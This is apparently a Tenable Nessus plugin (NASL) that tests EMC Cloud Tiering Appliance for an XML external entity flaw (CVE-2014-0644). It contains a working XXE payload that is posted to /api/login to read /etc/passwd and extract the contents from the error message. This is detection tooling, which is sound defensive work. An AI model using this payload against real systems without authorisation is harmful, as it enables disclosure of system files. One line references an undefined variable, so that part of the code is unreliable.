#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(73373);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/05/20 13:54:16 $");

  script_cve_id("CVE-2014-0644");
  script_bugtraq_id(66547);
  script_osvdb_id(105188);
  script_xref(name:"EDB-ID", value:"32623");

  script_name(english:"EMC Cloud Tiering Appliance XML External Entity (XXE) Arbitrary File Disclosure");
  script_summary(english:"Tries to get contents of a file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote EMC CTA install is affected by an arbitrary file disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote EMC Cloud Tiering Appliance (CTA) install is affected by an
arbitrary file disclosure vulnerability. It is possible to view any
file on the system by utilizing XML external entity injection in
specially crafted XML data sent to the REST service on the remote
host.

Note that hosts that are affected by this vulnerability are
potentially affected by other vulnerabilities though Nessus has not
tested for any additional vulnerabilities.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Mar/426");
   script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2014/Apr/att-93/ESA-2014-028.txt");
  script_set_attribute(attribute:"solution", value:"Apply Hot Fix for ESA-2014-028 per the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/03/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/04/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:emc:cloud_tiering_appliance");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:emc:cloud_tiering_appliance_virtual_edition");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("emc_cta_detect.nbin");
  script_require_keys("www/emc_cta_ui");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("webapp_func.inc");
include("http.inc");

get_kb_item_or_exit("www/emc_cta_ui");

app_name = "EMC Cloud Tiering Appliance";
port = get_http_port(default:443);
install = get_install_from_kb(appname:'emc_cta_ui', port:port, exit_on_fail:TRUE);

dir = install['dir'];
report_url = build_url(port:port, qs:dir);
url = "/api/login";
filename = "/etc/passwd";
contents = NULL;
vuln = FALSE;

postdata =
  '<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file://'+ filename + '" >]>
  <Request>
  <Username>' + SCRIPT_NAME + unixtime() + '</Username>
  <Password>&xxe;</Password>
  </Request>';

res = http_send_recv3(
  method:'POST',
  item:url,
  data:postdata,
  content_type:'text/xml',
  port:port,
  exit_on_fail:TRUE
  );

# Check for contents of file.
if ("root:x:0" >< res[2])
{
  contents = strstr(res[2],'<Message>For input string: "') - strstr(res[2], '"</Message>') - '<Message>For input string: "';
  vuln = TRUE;
}
else if (res[2] =~ 'java.io.FileNotFoundException: [\\/]' + test_file) vuln = TRUE;

if (vuln)
{
  if (report_verbosity > 0)
  {
    report =
    '\n' + "Nessus was able to obtain the contents of '" + filename + "' with the" +
    '\n' + 'following request :' +
    '\n' +
    '\n' +
    crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
    chomp(http_last_sent_request()) + '\n' +
    crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

    if (contents && report_verbosity > 1)
    {
      if (
        !defined_func("nasl_level") ||
        nasl_level() < 5200 ||
        !isnull(get_preference("sc_version"))
      )
      {
        report += '\nHere are the contents : \n\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        chomp(contents) + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
        security_hole(port:port, extra:report);
      }
      else
      {
        # Sanitize file names
        if ("/" >< filename) filename = ereg_replace(
          pattern:"^.+/([^/]+)$", replace:"\1", string:filename);
        report += '\nAttached is a copy of the file' + '\n';
        attachments = make_list();
        attachments[0] = make_array();
        attachments[0]["type"] = "text/plain";
        attachments[0]["name"] = filename;
        attachments[0]["value"] = chomp(contents);
        security_report_with_attachments(
          port  : port,
          level : 3,
          extra : report,
          attachments : attachments
        );
      }
    }
    else security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, report_url);
